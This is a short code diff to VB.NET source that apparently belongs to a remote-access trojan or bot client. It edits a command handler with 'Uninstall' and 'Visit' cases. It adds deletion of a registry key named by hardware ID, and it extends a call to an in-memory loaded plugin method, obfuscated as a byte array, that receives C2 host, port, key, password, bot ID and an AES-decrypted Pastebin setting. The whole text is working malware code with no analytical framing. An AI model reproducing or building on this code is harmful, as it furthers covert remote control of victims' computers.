@@ -32,6 +32,7 @@ Public Class C_Commands
                     End
 
                 Case "Uninstall"
+                    Microsoft.Win32.Registry.CurrentUser.DeleteSubKeyTree("Software\" & C_ID.HWID)
                     C_Installation.DEL()
 
                 Case "Visit"
@@ -78,7 +79,7 @@ Public Class C_Commands
             For Each A As Type In AppDomain.CurrentDomain.Load(B).GetTypes
                 For Each MF In A.GetMethods
                     If MF.Name = BS(New Byte() {82, 67}) Then 'RC
-                        MF.Invoke(Nothing, New Object() {C_Settings.HOST, C_Settings.PORT, C_Socket.KEY, C_Socket.SPL, C_Settings.PASS, C_Settings.fullpath})
+                        MF.Invoke(Nothing, New Object() {C_Settings.HOST, C_Settings.PORT, C_Socket.KEY, C_Socket.SPL, C_Settings.PASS, C_Settings.fullpath, C_ID.HWID, C_ID.Bot, C_Encryption.AES_Decrypt(C_Settings.Pastebin)})
                     End If
                 Next
             Next
